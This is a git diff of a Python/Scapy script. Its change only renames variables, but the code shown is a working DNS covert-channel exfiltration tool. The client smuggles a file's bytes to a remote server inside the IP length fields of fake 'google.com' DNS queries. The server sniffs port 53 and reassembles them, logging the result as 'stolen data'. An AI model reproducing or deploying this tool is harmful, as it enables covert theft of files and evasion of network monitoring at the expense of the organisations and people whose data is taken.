@@ -23,7 +23,7 @@ local_ip = get_if_addr(conf.iface)
 bp_filter = f"port 53"
 client_mode = False
 server_mode = False
-yonking_in_prog = False
+yanking_in_prog = False
 
 
 def print_help():
@@ -51,27 +51,27 @@ Example:
 ''')
 
 
-def yonking(packet):
-    global yonking_in_prog, file_name, yonked_data, yonked_hex
+def yanking(packet):
+    global yanking_in_prog, file_name, yanked_data, yanked_hex
     logging.debug("got a new packet")
     logging.debug(packet.summary())
     domain_quaried = packet[DNSQR].qname
     if domain_quaried != b"google.com." and domain_quaried != b"google.ca.":
-        yonking_in_prog = True
+        yanking_in_prog = True
         logging.debug(f"downloading a new file named {domain_quaried} in 64bit")
         file_name = b64decode(domain_quaried)
         open(file_name, "a").close()
         logging.info(f"downloading a new file named {file_name}")
-    elif domain_quaried == b"google.com." and yonking_in_prog == True:
-        yonked_hex = packet[IP].len - 0xff
-        logging.debug(f"got another hex byte {yonked_hex}")
-        yonked_data.append(yonked_hex)
-        logging.debug(f"total stolen data so far \n{yonked_data}")
-    elif domain_quaried == b"google.ca." and yonking_in_prog == True:
-        with open(file_name, "wb") as yonked_file:
-            yonked_file.write(yonked_data)
-        yonking_in_prog = False
-        yonked_data = bytearray()
+    elif domain_quaried == b"google.com." and yanking_in_prog == True:
+        yanked_hex = packet[IP].len - 0xff
+        logging.debug(f"got another hex byte {yanked_hex}")
+        yanked_data.append(yanked_hex)
+        logging.debug(f"total stolen data so far \n{yanked_data}")
+    elif domain_quaried == b"google.ca." and yanking_in_prog == True:
+        with open(file_name, "wb") as yanked_file:
+            yanked_file.write(yanked_data)
+        yanking_in_prog = False
+        yanked_data = bytearray()
         logging.info("saved a new file")
 
 
@@ -115,10 +115,10 @@ if client_mode:
     logging.debug(f"file name in base64 is {file_name64}")
     send(IP(dst=server_ip)/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname=file_name64)), verbose=0)
     logging.debug("sent file name")
-    with open(file_path, "rb") as yonking_file:
-        yonking_data = yonking_file.read()
-    logging.debug("read the file to be yonked")
-    for hex_bit in tqdm (yonking_data, desc='Sending Packets...', unit=' Bytes'):
+    with open(file_path, "rb") as yanking_file:
+        yanking_data = yanking_file.read()
+    logging.debug("read the file to be yanked")
+    for hex_bit in tqdm (yanking_data, desc='Sending Packets...', unit=' Bytes'):
         hex_bit = hex_bit + 0xff
         send(IP(dst=server_ip, len=hex_bit)/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname="google.com")), verbose=0)
         logging.debug(f"sent {hex_bit} hex byte")
@@ -126,6 +126,6 @@ if client_mode:
     logging.debug(f"send the end message")
 
 if server_mode:
-    yonked_data = bytearray()
+    yanked_data = bytearray()
     logging.debug("in server mode")
-    sniff(filter=bp_filter, prn=yonking)
+    sniff(filter=bp_filter, prn=yanking)
